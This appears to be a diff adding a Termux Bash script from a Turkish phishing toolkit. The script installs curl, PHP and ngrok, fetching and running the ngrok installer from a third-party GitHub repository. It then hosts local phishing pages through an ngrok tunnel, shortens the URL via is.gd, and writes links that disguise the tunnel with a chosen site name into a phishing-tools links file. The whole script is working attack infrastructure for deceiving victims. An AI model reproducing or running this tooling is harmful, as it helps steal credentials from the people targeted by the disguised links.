@@ -1,0 +1,245 @@
+#!/bin/bash
+# CURL  PAKET KONTROLÜ #
+
+if [[ ! -a $PREFIX/bin/curl ]];then
+	echo
+	echo
+	echo
+	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
+	echo
+	echo
+	echo
+	pkg install curl -y
+fi
+
+# PHP  PAKET KONTROLÜ #
+
+if [[ ! -a $PREFIX/bin/php ]];then
+	echo
+	echo
+	echo
+	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
+	echo
+	echo
+	echo
+	pkg install php -y
+fi
+
+# NGROK KONTROLÜ #
+
+if [[ ! -a $PREFIX/bin/ngrok ]];then
+	echo
+	echo
+	echo
+	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
+	echo
+	echo
+	echo
+	git clone https://github.com/umutkaratools/ngrok-kurulum
+	cd ngrok-kurulum
+	bash ngrok-kurulum.sh
+	cd ..
+	rm -rf ngrok-kurulum
+fi
+
+if [[ $1 == -d ]];then
+	vim $PREFIX/bin/link-create
+	exit
+fi
+
+####################
+
+# WİT #
+
+####################
+
+_wit() {
+if [[ ! -a $PREFIX/bin/ngrok ]];then
+	am start -a android.intent.action.VIEW http://localhost:4444/phishing-tools/phishing_files/error.php
+	exit
+fi
+if [[ ! -a information ]];then
+	echo
+	echo
+	echo
+	printf "\e[31m[!]\e[97m İNFORMATİON FİLE NOT FOUND"
+	echo
+	echo
+	echo
+	exit
+fi
+ngrok_pid=$(ps aux |grep "ngrok" |grep -v grep |grep -o http)
+if [[ -n $ngrok_pid ]];then
+	killall ngrok
+fi
+php_pid=$(ps aux |grep php |grep -v grep |grep 127.0.0.1:4545 |awk '{print $2}')
+if [[ -n $php_pid ]];then
+	kill -9 $php_pid
+fi
+port="4545"
+site=$(cat information |sed -n 1p)
+site_name=$(cat information |sed -n 2p)
+
+if [[ -a $PREFIX/bin/ngrok ]];then
+	php -S 127.0.0.1:$port & ngrok http $port > /dev/null &
+	end=$((SECONDS+60))
+	while [ $SECONDS -lt $end ];
+	do
+		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io |wc -l)
+		if [[ $control == 1 ]];then
+			break
+		fi
+	done
+	if [[ $control != 1 ]];then
+		am start -a android.intent.action.VIEW http://localhost:4444/phishing-tools/phishing_files/error.php
+		exit
+	fi
+	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io)
+	domain=$(echo -e "$url" |grep -o /[^,]\*.ngrok.io |tr -d '/')
+	special_link_source=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$site_name$(date +%d%m%G%H%S)")
+	special_link=$(echo -e "$special_link_source" |grep -o is.gd/[^,]\*\" |tr -d '"' |awk -F ' ' '{print $1}' |sed -n 1p)
+	echo -e "
+	<a href=\"$url\">$url</a>
+	<a href=\"$url\">$site$domain</a>
+	<a href=\"$url\">$site$special_link</a>
+	<a href=\"$url\">https://$special_link</a>" > /data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/phishing_files/links.txt
+	exit
+
+else
+	echo
+	echo
+	echo
+	printf "\e[1;31m[!] \e[33mNGROK \e[97mBULUNAMADI"
+	echo
+	echo
+	echo
+	exit
+		
+fi
+}
+if [[ $1 == --wit ]];then
+	_wit
+	exit
+fi
+
+####################
+####################
+
+
+####################
+
+# PHİSHİNG TOOLS #
+
+####################
+
+if [[ $1 == --port || $1 == -p ]];then
+	if [[ ! -a $PREFIX/bin/ngrok ]];then
+		echo
+		echo
+		echo
+		printf "\e[1;31m[!] \e[33mNGROK \e[97mBULUNAMADI"
+		echo
+		echo
+		echo
+		exit
+	fi
+	control=$(ps aux |grep ngrok |grep -v grep |grep http |awk '{print $2}' |wc -l)
+	if [[ $control != 0 ]];then
+		killall ngrok
+		killall php
+	fi
+	if [[ -a information ]];then
+		_port="4444"
+		php -S 127.0.0.1:$_port & ngrok http $_port > /dev/null &
+	else
+		if [[ -n $2 ]];then
+			php -S 127.0.0.1:$2 & ngrok http $2 > /dev/null &
+		else
+			echo
+			echo
+			echo
+			printf "\e[31m[!]\e[97m LÜTFEN PORT GİRİNİZ"
+			echo
+			echo
+			echo
+			exit
+		fi
+	fi
+	sleep 1
+	echo
+	echo
+	echo
+	printf "\e[1;33m[*]\e[97m LİNK OLUŞTURULUYOR.."
+	echo
+	echo
+	end=$((SECONDS+60))
+	while [ $SECONDS -lt $end ];
+	do
+		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io |wc -l)
+		if [[ $control == 1 ]];then
+			break
+		fi
+	done
+	if [[ $control != 1 ]];then
+		echo
+		echo
+		echo
+		printf "\e[1;31m[!] \e[33mNGROK HATALI \e[97mLİNK OLUŞTURULAMIYOR"
+		echo
+		echo
+		echo
+		exit
+	fi
+	echo
+	echo
+	echo
+	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o https://[^,]\*.ngrok.io)
+	domain=$(echo -e "$url" |grep -o /[^,]\*.ngrok.io |tr -d '/')
+	_information() {
+	clear
+	echo
+	echo
+	echo
+	printf "\e[1;32m
+	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+	\t\t\e[33mLİNKLER\e[32m
+
+
+	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m"
+	echo
+	echo
+	echo
+	printf "\e[1;31m[\e[97m1\e[31m]\e[97m $url"
+	echo
+	echo
+	echo
+	printf "\e[1;31m[\e[97m2\e[31m]\e[97m $(cat information |sed -n 1p)$domain"
+	special_link_source=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$(cat information |sed -n 2p)$(date +%d%m%G%H%S)")
+	special_link=$(echo -e "$special_link_source" |grep -o is.gd/[^,]\*\" |tr -d '"' |awk -F ' ' '{print $1}' |sed -n 1p)
+	echo
+	echo
+	echo
+	printf "\e[1;31m[\e[97m3\e[31m]\e[97m $(cat information |sed -n 1p)$special_link "
+	echo
+	echo
+	echo
+	printf "\e[1;31m[\e[97m4\e[31m]\e[97m https://$special_link"
+	echo
+	echo
+	echo
+	}
+	if [[ -a information ]];then
+		_information
+	else
+		printf "\e[1;31m[\e[97m LİNK \e[31m] >>\e[97m $url"
+		echo
+		echo
+		echo
+	fi
+	exit
+fi
+
+####################
+####################
